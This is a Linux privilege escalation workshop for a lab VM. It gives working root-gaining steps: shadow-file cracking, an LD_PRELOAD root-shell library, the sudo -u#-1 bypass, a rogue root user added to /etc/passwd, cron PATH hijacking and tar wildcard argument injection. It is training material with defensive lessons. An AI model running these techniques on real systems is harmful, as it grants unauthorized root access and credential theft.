# I am root - Linux Privilege Escalation Workshop

## Introduction
Welcome to our Linux Privilege Escalation Workshop!

Today, we will be dealing with the user and permission system in Linux - especially with misconfigurations that allow us to gain higher privileges. This will help us understand potential entry points and how to avoid them.

In Capture the Flags, the initial situation is often that one has access to an unprivileged user, or gains this by exploiting vulnerabilities.
For this, you receive the first flag, the User-Flag which is usually located in the `home` directory of the user.

The second flag is the Root-Flag, which is located in the `/root` directory.
However, `/root` is only readable for a user with root rights, so you have to gain these in some way.

There are basically many ways to achieve this goal. Capture the Flags are often themed, and there is only one way. In our workshop, however, we want to show several ways. Therefore, we do not use a root flag, this is pointless after the first exploited vulnerability.

You were successful when the shell shows a `#` symbol, or you are rewarded with the output `uid=0(root) gid=0(root) groups=0(root)` on the command `id`.

> **_Note:_**  In this workshop, we focus on exploiting misconfigurations. We will briefly introduce automated scripts and exploits, but will not look at them in more detail.

Happy Hacking!

## Start
We have prepared a Linux VM and a Docker container for the workshop, you can use both.
The advantage of the Docker container is that it is much slimmer than the VM.

The disadvantage of the Docker container is that due to its nature, not all workshop tasks can be processed.
This affects Cron Jobs and Docker itself.

**If possible, please use the VM - so you can understand all vulnerabilities!**

### Virtual Machine
- Install [VirtualBox](https://www.virtualbox.org/wiki/Downloads)
- Download the VM from [OneDrive](https://1drv.ms/u/s!AupinBFmdT3bhcJUDiXCJLH-ZisBgQ?e=rXGfZE)
- Import the VM into VirtualBox via File => Import Appliance
  - You can disable Optical Drive and USB Controller
- Start the VM via the context menu (Right click => Start => Normal Start) or via the green arrow
  - If you receive an error message regarding USB Controller or Optical Drive, just click it away
- You can also use your local console and access the VM via ssh (then the headless start is enough)

### Docker Container
- Install Docker (the easiest way is Docker Desktop, which is license-wise okay for our workshop, but for our daily work ❌ forbidden without a license)
  - alternatively, WSL2 also works, instructions can be found on the net
- Build the image from the Dockerfile in the repo and start the container
```
docker run --rm -it $(docker build -q ./machines)
```
- Alternatively, if inline doesn't work:
```
docker build ./machines -t lpe/hacking:latest docker run --rm -it lpe/hacking:latest
```

If you type `whoami` in the console and `john` comes back as the answer, you are ready for our joint adventure

> **_Note:_**  If you have any problems or questions, please contact us before the workshop so we can support you.
## Enumeration

### Manually
At the beginning there is always research. What kind of system am I on? Which Linux distribution, which kernel version?
Which users are still set up on this system?
What files are lying around here?
With this information, for example, kernel exploits can be identified, other users can be taken over or passwords can be found.

#### System
- `hostname`
- `/etc/os-release`
- `uname -a`
- `/proc/version`
- `/etc/issue`

#### Programs and Processes
- `ps aux`
- `env`
- `sudo -l`
- `history`

#### User
- `id`
- `/etc/passwd`
- `/etc/shadow`

#### Files and Directories
- `ls -la`
- `find /home -name passwords.txt` File “passwords.txt” in the /home directory
- `find / -type d -name config` Directory "config" under “/”
- `find / -type f -perm 0777` All files with full permissions for all users
- `find / -perm a=x` Executable files
- `find /home -user debian` Files of the user “debian” under “/home”
- `find / -perm -o w -type d` All directories writable by all users
- `find / -perm -u=s -type f` All files with set SUID bit

> **_Tip:_**  If you append ` 2>/dev/null` to a command, error outputs are redirected to digital nirvana. This keeps the console clearer.

### Automated
There are scripts and tools that take over the enumeration for you. This can save a lot of time, but these tools might overlook something.
Or they find something that you overlooked yourself.

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

To try out, the scripts are located under `/home/john/enum`.

## History File
All commands entered in the bash are stored in the history file (`~/.bash_history`), including commands that contain a password! For this reason, you should never give the password as a parameter in a command if possible.

### Task
Find out with which credentials the user `john` last logged into Docker.

### Solution
```
history | grep login
```

### Lessons Learned
If possible, use `-stdin` to give passwords to a program.
If there is no other way, remove the entry from the history afterwards.

## Weak Passwords
Not every user uses secure passwords.
You can try to guess passwords of other users, hoping that they have more extensive privileges than the current user.
Which users are set up on a machine is listed in the `/etc/passwd` file, which is readable by all, for example with `cat /etc/passwd`.
Entries look like this:

```
john:x:998:998::/home/john:/bin/bash
```

The values are separated by colons and stand for
* User Name
* Encrypted Password (x: is in the /etc/shadow file)
* User ID (UID)
* User Group ID (GID)
* User full name
* User home directory
* Login shell

There is another user `debian` on the machine, can you guess the password?
With `su debian` you can switch the user to `debian`.
Does this user bring us further?

### Cracking Weak Passwords
Passwords of user accounts are stored in the `/etc/shadow` file as a (salted) hash.
This file is normally only readable with root rights.
Maybe you have already noticed during the enumeration that the file on this machine is readable for everyone? Ouch.

With e.g. `cat /etc/shadow` you can therefore output the content.
The content is similar to the `/etc/passwd` file.

```
debian:$1$qWQ7rZJN$/wJHoCHD.iJzxST88cgi2.:19311::::::
```

The password hash is in the second position (after the user name) and is the extended Unix-Style `crypt(3)` password hash.
`$1$` identifies the hash type chosen for creation, the second part `qWQ7rZJN` is the salt and the part after the third `$` is the actual password hash.

If the password is a weak one, there is a possibility that it can be guessed with a so-called dictionary attack.
For this, hashes are formed from the entries of a word list with popular passwords and compared with the stored password hash.
If they match, the password matches the entry from the word list.

Two well-known programs for executing dictionary attacks on password hashes are Hashcat and John the Ripper.
Let's crack the password of the user `debian` with John the Ripper! John the Ripper is installed on the machine and in the home directory of `john` there is a file with 100 popular passwords `/home/john/top_100.txt`.

> **_Tip:_**  A comprehensive collection of word lists for users, passwords, directories is provided by [SecLists](https://github.com/danielmiessler/SecLists).

For cracking the password, two steps must be performed:
1. Unshadowing the `/etc/shadow` file with the `unshadow` tool belonging to John the Ripper
2. Word list attack on the password hashes

### Task
Perform the steps mentioned above to crack the password. What is it?

### Solution
Unshadowing the `/etc/shadow` file. We write the result into a file `unshadowed` in the home directory of our user John.

```
unshadow /etc/passwd /etc/shadow > /home/john/unshadowed
```

We apply the dictionary attack to this file with our password list.

```
john --wordlist=/home/john/top_100.txt /home/john/unshadowed
```

_pwned._

### Extra Task: Hashcat
Another tool for cracking hashes is, as already mentioned, Hashcat.
`hashcat -h` tells us that hashcat needs a hash type and an attack mode in addition to the hash and a dictionary.

From the structure of a hash, you can see which hash function was used to create it.
Tools support this, e.g. [Hash Identifier](https://hashes.com/en/tools/hash_identifier).
The codes for the hash type can also be found in the help, or in the [Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=example_hashes), there even with example hashes.

As Attack Mode we choose "Straight" (corresponds to a dictionary attack).

```
hashcat -m <Hash-Type-Code> -a 0 <file with hashes> <dictionary file>
```

Optionally, we can also write the results to a file with `-o`.

Go! Crack the password with Hashcat!

### Solution
We copy the hash from the `/etc/shadow` file into a new file, e.g. `/home/john/hash`.

[Hash Identifier](https://hashes.com/en/tools/hash_identifier) gives us `md5crypt` as the hash type.
According to hashcat help or wiki, the corresponding mode is `500`.

```
hashcat -m 500 -a 0 /home/john/hash /home/john/top_100.txt
```

Hashcat now cybers for a while and we watch with interest.

When hashcat is finished, you can output the result with `hashcat --show -m 500 /home/john/hash`.

### Lessons Learned
Weak passwords (especially those that could be in word lists) are absolutely to be avoided! No password anyway. Also, passwords that can be guessed are not recommended.

## sudo
![comic; what's the magic word? answer: sudo](sudo.jpg)

Sudo allows a user to execute programs with root rights. This way, an administrator can give individual users the ability to execute certain programs despite limited access.

The configuration is stored in the `/etc/sudoers` file. If you don't know it yet, take a look at it as soon as you have gained root rights. You could then even grant `john` further rights.

> **_Note:_**  The sudoers file is best edited with visudo, which performs a syntax check on the file. If the file is broken, it may lead to not being able to gain root rights on this system anymore.

Which programs are configured for the logged-in user in sudo can be found out with the `sudo -l` command.

For some programs, there is the possibility to read files or spawn a shell - and if the program was executed with root rights, to read/write files with root read access (e.g. /etc/shadow) or to spawn a root shell.
A collection of these programs and how to exploit this vulnerability is offered by [gtfobins](https://gtfobins.github.io/).

### Task
Take a look with `sudo -l`, which programs `john` has configured for sudo.
Search for these programs on [gtfobins](https://gtfobins.github.io/) and play around with them a bit.
Can you manage to gain root rights?

### LD_PRELOAD
LD_PRELOAD allows programs to use shared libraries (so-called shared objects). If the `env_keep` option is enabled, we can create a shared library and pass it to a program that we call with sudo. The library is then executed first. For example, such a library could spawn a root shell.

This C code spawns a root shell:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

The code can be compiled into a shared object:

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles -w
```

And pass it when calling a program with root rights.

```
sudo LD_PRELOAD=/home/john/shell.so find
```

### CVE-2019-14287
Sudo also allows with `sudo -u#<id> <command>` to execute a command with a certain user. However, the user must have the permission.
With `sudo -u#0 whoami`, whoami would be called with root rights (the ID of the root user is 0), provided the calling user has the permission to call whoami as root.
Until sudo in version < 1.8.28, there was a bug, which in combination with a misconfiguration allowed a program to be executed with root rights, although this was explicitly excluded in the configuration.
The configuration looks like this and allows the execution of the program (or all programs) as any other user than root:

```
<user> ALL=(ALL:!root) NOPASSWD: ALL
```


If the unprivileged user now calls the command with the id `-1`, sudo interprets this as `0`, but the configuration does not apply, because `-1` is not the id of `root`.

#### Task
Spawn a root shell.

#### Solution
```
sudo -u#-1 bash
```

### Lessons Learned
Be sparing with sudo permissions.
Check binaries beforehand on [gtfobins](https://gtfobins.github.io/) if they allow Privilege Escalation or editing protected files.
Do not activate the `env_keep` option if it is not absolutely necessary.
Keep your system up to date.

## SUID/SGID

### Excursion: Linux Permissions
Permissions control whether a user can read, write, or execute a file depend on the files themselves. You can display these permissions with the command `ls -l`.

```
#ls -l
  drwxr-xr-x   4   john  user     128 B     Wed Sep 21 15:15:52 2022   docker/
  -rw-r-----   1   john  user       4 KiB   Wed Sep 21 16:52:10 2022   lpe_workshop.md
```

The first character identifies files `-` and directories `d`.
The permissions are then as 3-blocks for each read, write, execute.

There are three blocks each: Owner, Group, Everyone.
`r` stands for read, `w` for write, and `x` for execute. `-` means no permission at this point.

In the example above, the user `john` has read and write permissions for the file `lpe_workshop.md` because he is the owner. The group `user` may read and all other users may do nothing.

The root user is basically allowed to do everything (that's why we're so hot on him).

## SUID/SGID Bit
Sometimes you see in the owner or group block of a file instead of the `x` an `s`. This is then the SUID, or SGID bit. It states that this file with the rights of the owner, or with the group. In the example below, the program passwd is provided with the SUID bit, because a normal user should be able to execute it to change his password, but for this a protected file must be edited (`/etc/shadow`), which he otherwise cannot edit.

```
-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
```

Files with the SUID/SGID bit can be tracked down with the `find` command:

```
find / -perm -u=s -user root 2>/dev/null
find / -perm -g=s -group root 2>/dev/null
```

### Exploit
How does this help us gain root rights on a machine?
On gtfobins you can filter the programs on SUID.

From some programs, you can break out with the SUID/SGID flag set and spawn a root shell. If the SUID/SGID bit is set on an editor, you can alternatively also edit the `/etc/passwd` file and create a new user with root rights.

### Task
Find files with SUID/SGID bit and try to gain root rights.

### Solution
We look at which files have the SUD bit set.

```
find / -perm -u=s -user root 2>/dev/null
```

In the list, we find an editor (nano).
With it, we can edit the write-protected ˙/etc/passwd` file.

We generate a password hash for this.

```
openssl passwd -1 -salt foo password123
$1$foo$yKXUGOo1ZIgTvE6smA/W//
```

We add a new user with the generated password hash to the `/etc/passwd` file with nano.

```
jane:$1$foo$yKXUGOo1ZIgTvE6smA/W//:0:0:root:/root:/bin/bash
```

Or a little simpler: We spawn a root shell with agetty (found on [gtfobins](https://gtfobins.github.io/gtfobins/agetty/)):

```
agetty -o -p -l /bin/sh -a root tty
```

With the command `su jane` we can switch to the new user - and have a root shell.

### Lessons Learned
Search your system with the above `find` commands, which programs have the sticky bit set and check on [gtfobins](https://gtfobins.github.io/), if this can be exploited.

## Capabilities

Capabilities are a way to grant rights more granularly. If the admin doesn't want to give the user extended rights, they can give individual permissions to a tool. This allows the user to use the tool without getting permission errors, but they themselves do not have extended rights.

With the command `getcap`, executables with extended capabilities can be tracked down (to keep the output compact, we throw away the error outputs `2>/dev/null`).

```
getcap -r / 2>/dev/null
```

[gtfobins](https://gtfobins.github.io/) also helps you with capabilities.

### Task

Find a file with set capabilities and the matching exploit on [gtfobins](https://gtfobins.github.io/).

### Solution

```
getcap -r / 2>/dev/null
```

With this command, we find the copy of vim under /home/john/vim with extended rights.

On [gtfobins](https://gtfobins.github.io/) we find a way how we can get root rights with vim and this capability.

```
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

With this, vim sets the uid for itself to 0 (root) and starts a shell with these rights.

### Lessons Learned
Search your system with `getcap`, which programs have capabilities and check on [gtfobins](https://gtfobins.github.io/), if this can be exploited.

## CronJobs
Cron Jobs allow programs or scripts to be executed automatically at certain times.
These jobs are stored in a file, `/etc/crontab` which is by default only editable with root rights. What the numbers and stars mean is explained by [crontab.guru](https://crontab.guru/). You can display them with `cat /etc/crontab`. These jobs are then executed by the Cron daemon and with the rights of the owner of the file.

> **_Note:_**  Cron doesn't run very well in Docker due to the "One process per container" policy.
> Therefore, this example cannot be recreated in the Docker container. Nevertheless, enum scripts should recognize this misconfiguration.

### Path Variable
At the beginning of the Cron table, the shell that Cron uses is defined. In addition, a path variable is defined, in which Cron searches for executable files if their call is not made with a fully qualified path. The order is from left to right.

A little further down, the job `backup_root.sh` is defined. As we can see, the call is not with a fully qualified path.

If we want to know where backup_root.sh is located, we can find out with the `find` command.

```
find / -name backup_root.sh 2>/dev/null
/bin/backup_root.sh
```

#### Task
If we had a script with the same name in a directory that is searched before `/bin`, then this file would be executed instead of the file `/bin/backup_root.sh`. And this script would then do what we want.

Would, could.. Do it!

#### Solution
In the path variable in the crontab, the first directory is `/scripts`. This directory is writable for everyone to our luck. This means, we can put a script `backup_root.sh` there and it will be executed by Cron instead of the one in the `/bin` directory.

We use the SUID bit we learned earlier for this.
For this, we copy the bash in the backup script to another location and set the SUID bit.

```
echo 'cp /bin/bash /scripts/bash; chmod +s /scripts/bash' > /scripts/backup_root.sh
```

If we start the copied bash with the argument "-p", it retains its privileges and we have a root shell.

Alternatively, we can have a user with root rights created in the `/scripts/backup_root.sh`.

```
#!/bin/sh
JANE='jane:\$1\$iteratec\$45qXWta7eRNhUghQ4Uu8q/:0:0:root:/root:/bin/bash'
sed -n "\|$JANE|q;\$a $JANE" /etc/passwd >> /etc/passwd
```

### Weak File Permissions
With `cat /etc/crontab` we see in the Cron table, among other things, the script backup_home.sh. We can view the permissions of this script with `ls -la`:

```
-rwxr-xrwx 1 root root 61 Nov 14 10:43 /etc/backup_home.sh
```

We see that every user can edit this file. That's bad. So good. Good for us!

#### Task
We should take advantage of the fact that we can edit the script.
Change the script so that it does what you want - with root rights!

#### Solution
We can again copy the bash here, equip it with the SUID bit and execute it with the argument `-p`, or alternatively create a new user with root rights in the `/etc/passwd` file.

### Wildcard Injection
In the Cron table, there is another interesting job that runs with root rights: `archive_john.sh`.
The script creates an archive of all files in `/home/john` with tar and saves it as `/backup/john.tgz`. For this, it uses the wildcard `*` to add all files in the `/home/john` directory to the archive.

In the [tar section](https://gtfobins.github.io/gtfobins/tar/) on gtfobins, we see that `tar` can be called with arguments to spawn a shell.
If `tar` is called with root permissions, these permissions are not discarded and we have a root shell.

But how do we get the arguments into `tar`? The script itself is unfortunately only writable by the owner. This is where the wildcard comes into play. If tar wants to add a file to the archive and the filename looks like an argument, it is interpreted as an argument.

#### Task
Inject the required arguments into `tar` to get a root shell.

#### Solution
Create a script in the `/home/john` directory that again copies the bash and equips it with the SUID bit.

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/john/rootshell.sh
```

Also create the two arguments as files in the `home/john` directory

```
echo "" > "--checkpoint-action=exec=sh rootshell.sh"
echo "" > --checkpoint=1
```

The command that is called in the script by the cron job then looks like this:

```
tar cf /backups/backup.tgz --checkpoint=1 --checkpoint=action=exec=sh rootshell.sh
```

- checkpoint[=x] - Use “checkpoints”: Show a progress message every x entries
- checkpoint-action=ACTION: Perform ACTION at each checkpoint, in our case exec
- exec=COMMAND: Execute the COMMAND, in our case the script which copies the shell and equips it with the SUID bit

When the job has run the next time, `/tmp/bash -p` should spawn a root bash.

### Lessons Learned
Check the jobs you have configured.
- Are they executed with root rights?
- Are there directories in the path that can be written to by users other than root?
- Are wildcards used in scripts and can this be exploited?

## Kernel Exploits
If a system is not up to date, the kernel may be vulnerable to a kernel exploit. These can be found either with a tool/script (e.g., [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) or Metasploit's local_exploit_suggester module) or by googling kernel version + exploit and databases such as [Exploit-DB](https://www.exploit-db.com/).

### Lessons Learned
Even if we haven't tried this now, it should be clear: keep your system up to date!

## What now?
You've got a taste for it and would like to learn and do more about Linux Privilege Escalation, Hardening & Co.?
Here are some resources on the topic to keep you from getting bored at the end of the year:

### Reading
- [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [Ethical Hacking Notes](https://enotes.nickapic.com/Linux-Priv-Esc-285bbed8681645c38c32a6952f4e52af)
- [Resource collection](https://github.com/Aksheet10/Cyber-security-resources#linux)

### Learning and CTFs
- [tryhackme](https://tryhackme.com) offers a lot of CTFs, where LPE often plays a role (we also have an iteratec organization, which you will be assigned to if you register with your iteratec email address)
- [hackthebox](https://app.hackthebox.com/home)
- [hackthebox Academy](https://academy.hackthebox.com/paths) has a Local PE learning path
- [Link Collection](https://razvioverflow.github.io/starthacking) for learning & CTFs
